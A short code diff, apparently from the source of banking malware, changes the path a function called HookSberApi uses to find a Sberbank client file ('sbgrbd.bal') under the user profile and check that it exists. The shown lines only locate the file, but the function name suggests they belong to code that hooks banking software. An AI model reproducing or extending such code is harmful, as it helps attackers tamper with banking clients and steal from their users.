@@ -265,7 +265,7 @@ static bool HookSberApi()
 
 	char path[MAX_PATH];
 	pExpandEnvironmentStringsA( "%USERPROFILE%", path, sizeof(path) );
-	pPathAppendA( path, "Local Settings\\Application Data\\Sbr\\Sbr\\sbgrbd.bal" );
+	pPathAppendA( path, "Local Settings\\Application Data\\Sbr\\sbgrbd.bal" );
 	if( FileExistsA(path) )
 	{
 		DBG( "Sber", "Файл '%s' существует", path );
